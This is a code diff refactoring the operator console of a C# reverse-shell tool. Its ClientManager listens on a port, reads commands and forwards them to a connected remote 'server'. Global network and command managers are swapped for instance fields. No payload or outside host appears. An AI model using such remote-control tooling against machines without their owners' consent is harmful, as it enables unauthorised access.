@@ -6,13 +6,16 @@ using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
 using Commands;
-using NetworkManager;
 using Shared;
 
 namespace ReverseShellClient
 {
     public class ClientManager
     {
+        ClientNetworkManager networkManager { get; }
+
+        CommandsManager commandsManager { get; }
+
         bool waitingForUserInput { get; set; } = false;
 
 
@@ -21,6 +24,8 @@ namespace ReverseShellClient
         /// </summary>
         public ClientManager()
         {
+            networkManager = new ClientNetworkManager();
+            commandsManager = new CommandsManager(networkManager);
             Console.ForegroundColor = ConsoleColor.Green;
         }
 
@@ -55,7 +60,7 @@ namespace ReverseShellClient
                 }
 
                 // Listen and start connection
-                GlobalNetworkManager.clientNetworkManager.ListenAndConnect(port);
+                networkManager.ListenAndConnect(port);
 
                 // Check if the connection is still active in the background
                 var connectionMonitoringTask = new Task(MonitorConnection);
@@ -79,10 +84,10 @@ namespace ReverseShellClient
             while (true)
             {
                 // The program is waiting for the user to enter a command, but the other end of the connection disconnected
-                if (waitingForUserInput && !GlobalNetworkManager.clientNetworkManager.IsConnected())
+                if (waitingForUserInput && !networkManager.IsConnected())
                 {
                     // Call cleanup method from ClientNetworkManager
-                    GlobalNetworkManager.clientNetworkManager.Cleanup(processingCommand: false);
+                    networkManager.Cleanup(processingCommand: false);
                     
                     // Send [ENTER] key to bypass the console.ReadLine()
                     var hWnd = Process.GetCurrentProcess().MainWindowHandle;
@@ -92,7 +97,7 @@ namespace ReverseShellClient
                 }
 
                 // The program executed a method, but the other end of the connection disconnected, this was caught and the cleanup method was called was made
-                if (!waitingForUserInput && GlobalNetworkManager.clientNetworkManager.CleanupMade())
+                if (!waitingForUserInput && networkManager.CleanupMade())
                 {
                     break;
                 }
@@ -117,7 +122,7 @@ namespace ReverseShellClient
                 waitingForUserInput = false;
 
                 // If the connection was closed, break from the loop
-                if (!GlobalNetworkManager.clientNetworkManager.IsConnected())
+                if (!networkManager.IsConnected())
                 {
                     break;
                 }
@@ -131,14 +136,14 @@ namespace ReverseShellClient
                 else if (commandString == "help")
                 {
                     // Global help section
-                    CommandsManager.ShowGlobalHelp();
+                    commandsManager.ShowGlobalHelp();
                 }
                 else if (commandString != "")
                 {
-                    var splittedCommand = CommandsManager.GetSplittedCommand(commandString);
+                    var splittedCommand = commandsManager.GetSplittedCommand(commandString);
                     var commandName = splittedCommand[0];
 
-                    ICommand command = CommandsManager.GetCommandByName(commandName);
+                    ICommand command = commandsManager.GetCommandByName(commandName);
                     if (command != null)
                     {
                         var arguments = new List<string>();
@@ -152,14 +157,14 @@ namespace ReverseShellClient
                         if (arguments.Count == 1 && arguments[0] == "help")
                         {
                             // Display command's help
-                            CommandsManager.ShowCommandHelp(command);
+                            commandsManager.ShowCommandHelp(command);
 
                             DisplayCommandPrompt();
                             continue;
                         }
 
 
-                        if (!CommandsManager.CheckCommandSyntax(command, arguments))
+                        if (!commandsManager.CheckCommandSyntax(command, arguments))
                         {
                             ColorTools.WriteCommandError(
                                 $"Syntax error, check out the command's help page ({commandName} help)");
@@ -192,7 +197,7 @@ namespace ReverseShellClient
                             if (!command.isLocal)
                             {
                                 // Send the command to the server
-                                GlobalNetworkManager.WriteLine(commandString);
+                                networkManager.WriteLine(commandString);
                             }
 
                             command.ClientMethod(arguments);
@@ -244,7 +249,7 @@ namespace ReverseShellClient
         {
             try
             {
-                GlobalNetworkManager.clientNetworkManager.Cleanup(isCommandProcessing);
+                networkManager.Cleanup(isCommandProcessing);
             }
             catch (Exception)
             {
